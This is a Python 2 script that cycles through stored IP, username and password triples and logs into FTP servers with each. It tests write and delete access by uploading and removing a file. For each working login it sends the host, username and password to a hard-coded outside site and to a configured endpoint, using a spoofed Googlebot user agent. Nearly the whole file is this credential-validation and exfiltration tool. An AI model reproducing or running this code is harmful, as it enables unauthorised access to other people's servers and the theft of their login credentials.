#!/usr/local/bin/python
from ftplib import FTP
import time
import socket
socket.setdefaulttimeout(10)
import Csqlite3
import threading
import thread
import ConfigParser
import urllib2

#http://blog.csdn.net/tianzhu123/article/details/7632104

class CS_passwordFTP(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()
        self.ftpID=0
        self.ftppassword=0
        self.Auploadfile="gost.ini"

        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("gost.ini"))
            self.Auploadfile = config.get("DATA","uploadfile")
            self.http_post = config.get("DATA","http_post")
        except:
            print "INI--try: except:uploadfile,http_post"

    def run(self):
        try:

#            #print self.Auploadfile
            self.open_mysql()
#            #if self.ftpconnect("127.0.0.1","admin","admin"):
#            #    print self.ftpID
        except:
            print "====--CS_passwordFTP---run try: except:===="
            time.sleep(60)
            self.run()

    def open_mysql(self):
        try:
            self.ftppassword=self.ftppassword+1
            #print self.ftppassword
            if self.ftppassword==1:
                time.sleep(60)
                self.ftppasswordA()
            if self.ftppassword==2:
                time.sleep(60)
                self.ftppassword3()
            if self.ftppassword==3:
                time.sleep(60*5)
                self.ftppassword0()

            if self.ftppassword>=3:
                self.ftppassword=0

            time.sleep(60)
            self.open_mysql()
        except:
            print "====--CS_passwordFTP URL try: except:===="
            time.sleep(4)
            self.open_mysql()

    def url_post(self,URL):
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)
            time.sleep(3)
        except:
            return 0

    def ftppasswordA(self):
        try:#select * from ftppassword0 where root is NULL
            sql="select * from ftppassword0 where root is NULL"
            self.sql3.conn.commit()
            cur = self.sql3.conn.cursor()
            cur.execute(sql)
            res = cur.fetchall()
            for row in res:
                #print row[0],row[1],row[2]
                if self.ftpconnect(row[0],row[1],row[2]):
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    if self.ftpID==1:
                        A0 = "update ftppassword0 set root='1' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    if self.ftpID==2:
                        A0 = "update ftppassword0 set root='2' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(row[0],row[1],row[2])
                        self.url_post(URL)
                        URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    if self.ftpID==3:
                        A0 = "update ftppassword0 set root='3' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        A1 = "insert into ftppassword3(IP,user,password,root,time) VALUES('%s','%s','%s','3','%s')"\
                             %(row[0],row[1],row[2],time.strftime('%Y.%m.%d-%H.%M.%S'))
                        self.sql3.mysqlite3_insert(A1)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(row[0],row[1],row[2])
                        self.url_post(URL)
                        URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                        #print "-"*30
                else:
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        #print "-"*30

            cur.close()
            time.sleep(60)
            self.open_mysql()
        except:
            time.sleep(4)
            self.open_mysql()

    def ftppassword0(self):
        try:#select * from ftppassword0 where root is NULL
            sql="select * from ftppassword0"
            self.sql3.conn.commit()
            cur = self.sql3.conn.cursor()
            cur.execute(sql)
            res = cur.fetchall()
            for row in res:
                #print row[0],row[1],row[2]
                if self.ftpconnect(row[0],row[1],row[2]):
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    if self.ftpID==1:
                        A0 = "update ftppassword0 set root='1' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    if self.ftpID==2:
                        A0 = "update ftppassword0 set root='2' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(row[0],row[1],row[2])
                        self.url_post(URL)
                        URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    if self.ftpID==3:
                        A0 = "update ftppassword0 set root='3' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        A1 = "insert into ftppassword3(IP,user,password,root,time) VALUES('%s','%s','%s','3','%s')"\
                             %(row[0],row[1],row[2],time.strftime('%Y.%m.%d-%H.%M.%S'))
                        self.sql3.mysqlite3_insert(A1)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(row[0],row[1],row[2])
                        self.url_post(URL)
                        URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                        #print "-"*30
                else:
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword0 set root='NO' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        #print "-"*30

            cur.close()
            time.sleep(60)
            self.open_mysql()
        except:
            time.sleep(4)
            self.open_mysql()

    def ftppassword3(self):
        try:#select * from ftppassword0 where root is NULL
            sql="select * from ftppassword3"
            self.sql3.conn.commit()
            cur = self.sql3.conn.cursor()
            cur.execute(sql)
            res = cur.fetchall()
            for row in res:
                #print row[0],row[1],row[2]
                if self.ftpconnect(row[0],row[1],row[2]):
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword3 set time='%s',root='NO' where IP='%s' and user='%s'"%(time.strftime('%Y.%m.%d-%H.%M.%S'),row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    if self.ftpID==1:
                        A0 = "update ftppassword3 set root='1' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    if self.ftpID==2:
                        A0 = "update ftppassword3 set time='%s',root='2' where IP='%s' and user='%s'"%(time.strftime('%Y.%m.%d-%H.%M.%S'),row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(row[0],row[1],row[2])
                        self.url_post(URL)
                        URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    if self.ftpID==3:
                        A0 = "update ftppassword3 set root='3' where IP='%s' and user='%s'"%(row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                        URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(row[0],row[1],row[2])
                        self.url_post(URL)
                        URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,row[0],row[1],row[2])
                        self.url_post(URL1)
                        print "POST:",URL1
                    #print "-"*30
                else:
                    #print "-"*30
                    if self.ftpID==0:
                        A0 = "update ftppassword3 set time='%s',root='NO' where IP='%s' and user='%s'"%(time.strftime('%Y.%m.%d-%H.%M.%S'),row[0],row[1])
                        self.sql3.mysqlite3_update(A0)
                    #print "-"*30

            cur.close()
            time.sleep(60)
            self.open_mysql()
        except:
            time.sleep(4)
            self.open_mysql()
    ################################################
    def ftpconnect(self,host,user,pwd):
        ftp=FTP()
        try:
            ftp.connect(host,21)
            ftp.login(user,pwd)
            self.ftpID=1
            if self.uploadfile(ftp):
                self.delete(ftp)

            ftp.quit()
            return 1
        except:
            self.ftpID=0
            try:
                ftp.quit()
            except:
                ftp.close()
            return 0

    def uploadfile(self,ftpU):
        try:
            bufsize = 1024
            fp = open(self.Auploadfile,'rb')
            ftpU.storbinary('STOR '+ self.Auploadfile ,fp,bufsize)
            fp.close()
            self.ftpID=2
            return 1
        except:
            return 0

    def delete(self,ftpD):
        try:
            ftpD.delete(self.Auploadfile)
            self.ftpID=3
            return 1
        except:
            return 0
            ################################################

################################################
if __name__=='__main__':
    threads = []
    nthreads=1
    for i in range(nthreads):
        threads.append(CS_passwordFTP())

    for thread in threads:
        thread.start()


